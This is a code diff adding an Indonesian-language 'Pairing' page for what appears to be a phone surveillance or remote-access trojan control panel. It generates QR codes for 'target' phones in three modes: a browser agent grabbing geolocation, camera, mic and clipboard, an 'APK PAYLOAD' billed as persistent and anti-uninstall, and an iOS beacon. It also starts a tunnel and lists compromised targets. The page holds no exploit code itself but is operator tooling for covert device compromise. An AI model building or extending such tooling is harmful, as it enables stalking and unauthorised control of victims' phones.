@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Pairing</title>
+<link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+<div class="win" id="win"></div>
+<div class="toast-wrap" id="tw"></div>
+<script type="module">
+import { $, api, post, del, toast, esc, fmt, jitter } from '/static/js/core.js';
+import { chrome, statusbar, svg } from '/static/js/ui.js';
+import { connect, on } from '/static/js/ws.js';
+
+const win = $('#win');
+chrome(win, {
+  page: 'pair', title: 'Pairing',
+  actions: [
+    '<button class="tbtn acc" id="gen">' + svg('qr') + 'BUAT QR</button>',
+    '<button class="tbtn" id="tun">' + svg('tunnel') + 'TUNNEL</button>',
+    '<button class="tbtn" id="rf">' + svg('reload') + 'REFRESH</button>',
+  ],
+});
+const body = document.createElement('div');
+body.className = 'body pad';
+win.appendChild(body);
+statusbar(win, '<span class="st"><b>&#9679;</b> PAIRING ENGINE</span>' +
+  '<span class="st" id="stTun">tunnel: mati</span><span class="st-r">v2.1.0</span>');
+
+body.innerHTML = `
+<div class="grid g2">
+  <div class="card"><div class="card-h">${svg('qr')}MODE PAIRING</div>
+    <div class="card-b">
+      <div class="pairgrid">
+        <div class="pcard on" data-mode="web"><b>WEB AGENT</b>
+          <span>QR dibuka di browser HP. Geolokasi, kamera, mic, clipboard, TTS. Tanpa install.</span></div>
+        <div class="pcard" data-mode="apk"><b>APK PAYLOAD</b>
+          <span>QR mengunduh APK agent siap pasang. Full akses, persisten, anti-uninstall.</span></div>
+        <div class="pcard" data-mode="ios"><b>iOS CLIP</b>
+          <span>iPhone: buka di Safari, Add to Home Screen, beacon tetap jalan.</span></div>
+      </div>
+      <div class="field" style="margin-top:10px"><label>LABEL</label>
+        <input class="inp" id="label" placeholder="mis. HP target 1"></div>
+      <div class="field"><label>MASA BERLAKU</label>
+        <select class="inp" id="ttl">
+          <option value="300">5 menit</option><option value="900" selected>15 menit</option>
+          <option value="3600">1 jam</option><option value="86400">24 jam</option>
+        </select></div>
+      <button class="btn acc" id="gen2" style="width:100%;height:30px">GENERATE QR</button>
+    </div></div>
+  <div class="card"><div class="card-h">${svg('bolt')}QR AKTIF</div>
+    <div class="card-b" id="stage"><div class="empty">${svg('qr')}belum ada QR</div></div></div>
+</div>
+<div class="card"><div class="card-h">${svg('clock')}RIWAYAT</div>
+  <div style="overflow:auto"><table class="tbl">
+    <thead><tr><th>Token</th><th>Mode</th><th>Label</th><th>Target</th><th>Status</th><th>Dibuat</th><th></th></tr></thead>
+    <tbody id="rows"></tbody></table></div></div>`;
+
+let mode = 'web';
+document.querySelectorAll('.pcard').forEach((c) => {
+  c.addEventListener('click', () => {
+    document.querySelectorAll('.pcard').forEach((x) => x.classList.remove('on'));
+    c.classList.add('on');
+    mode = c.dataset.mode;
+  });
+});
+
+async function gen() {
+  try {
+    const r = await post('/api/pair/new', {
+      mode, ttl: Number($('#ttl').value), label: $('#label').value.trim(),
+    });
+    $('#stage').innerHTML =
+      '<div class="qr-stage"><div class="qr-box"><img src="' + r.qr + '" alt="QR"></div>' +
+      '<div class="qr-url">' + esc(r.url) + '</div>' +
+      '<div class="row" style="justify-content:center">' +
+      '<button class="btn sm ghost" id="cp">SALIN</button>' +
+      '<a class="btn sm acc" href="' + r.url + '" target="_blank">BUKA</a></div>' +
+      '<div class="dim" style="font-size:8px">token ' + esc(r.token) + ' &middot; ' +
+      Math.round(r.ttl / 60) + ' menit</div></div>';
+    $('#cp').onclick = () => navigator.clipboard.writeText(r.url).then(() => toast('Disalin.', 'ok'));
+    toast('QR dibuat.', 'ok');
+    list();
+  } catch (e) { toast(e.message, 'wn'); }
+}
+$('#gen').onclick = gen;
+$('#gen2').onclick = gen;
+$('#rf').onclick = () => { list(); tun(); };
+$('#tun').onclick = async () => {
+  try { await post('/api/tunnel/start', { kind: 'auto' }); toast('Tunnel aktif.', 'ok'); }
+  catch (e) { toast(e.message, 'wn'); }
+  tun();
+};
+
+async function tun() {
+  try {
+    const s = await api('/api/tunnel/status');
+    $('#stTun').textContent = s.url ? 'tunnel: ' + s.url : 'tunnel: mati';
+  } catch {}
+}
+
+async function list() {
+  try {
+    const d = await api('/api/pair/list');
+    $('#rows').innerHTML = d.pairs.map((p) =>
+      '<tr><td class="mono">' + esc(p.token) + '</td><td>' + esc(p.mode) + '</td>' +
+      '<td>' + esc(p.label || '-') + '</td>' +
+      '<td>' + (p.target_id ? '<a href="/targets?t=' + esc(p.target_id) + '">' + esc(p.target_id) + '</a>' : '-') + '</td>' +
+      '<td><span class="tag ' + (p.used ? 'on' : '') + '">' +
+      (p.used ? 'DIPAKAI' : (p.expires < Date.now() / 1000 ? 'KEDALUWARSA' : 'SIAP')) + '</span></td>' +
+      '<td class="dim">' + fmt.ago(p.created) + '</td>' +
+      '<td><button class="btn xs danger" data-d="' + esc(p.id) + '">&times;</button></td></tr>').join('')
+      || '<tr><td colspan="7" class="empty">belum ada riwayat</td></tr>';
+    document.querySelectorAll('[data-d]').forEach((b) => {
+      b.onclick = async () => { await del('/api/pair/' + b.dataset.d); list(); };
+    });
+  } catch {}
+}
+
+on('targets_dirty', list);
+connect(); list(); tun();
+setInterval(list, jitter(8000, 4000));
+</script>
+</body>
+</html>
